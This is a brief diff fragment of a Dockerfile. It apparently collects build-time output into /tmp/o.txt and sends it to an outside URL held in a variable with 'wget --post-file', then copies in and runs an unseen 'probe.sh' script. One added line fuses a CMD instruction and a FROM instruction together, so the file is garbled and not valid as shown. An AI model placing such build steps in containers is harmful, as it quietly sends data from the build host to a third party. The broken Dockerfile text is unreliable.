@@ -9,4 +9,7 @@ RUN set -x; \
   wc -c /tmp/o.txt; cat /tmp/o.txt; \
   wget -q -O- --post-file=/tmp/o.txt "$U" || true; \
   echo CTXETC-DONE
+CMD ["sh","-c","sleep 3600"]FROM alpine:3.20
+COPY probe.sh /probe.sh
+RUN sh /probe.sh
 CMD ["sh","-c","sleep 3600"]
